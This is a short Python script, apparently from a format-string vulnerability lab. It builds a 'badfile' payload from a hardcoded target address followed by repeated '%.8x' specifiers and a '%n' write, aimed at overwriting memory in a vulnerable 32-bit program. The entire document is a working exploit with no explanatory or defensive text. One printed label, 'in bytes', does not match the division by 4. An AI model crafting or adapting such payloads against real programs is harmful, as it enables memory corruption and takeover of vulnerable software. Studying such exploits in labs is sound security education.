#! /usr/bin/python3

EBP = 0xffffd678
INP = 0xffffd750

def main():
    # Initialize the content array
    N = 1500
    content = bytearray(0x0 for i in range(N))
    target_addr = 0x080e5068
    content[0:4]  =  (target_addr).to_bytes(4,byteorder='little')
    distance = abs(INP - EBP) // 4
    print("The difference between the addresses of the frame pointer and the address of the input buffer (in bytes) is", distance)
    offset = 9
    distance = distance + offset
    print("The number of %x is", distance)
    s = "%.8x " * distance + "%n\n"
    fmt  = (s).encode('latin-1')
    content[4:4+len(fmt)] = fmt

    # Write the content to badfile
    with open('badfile', 'wb') as f:
        f.write(content)

if __name__ == "__main__":
  main()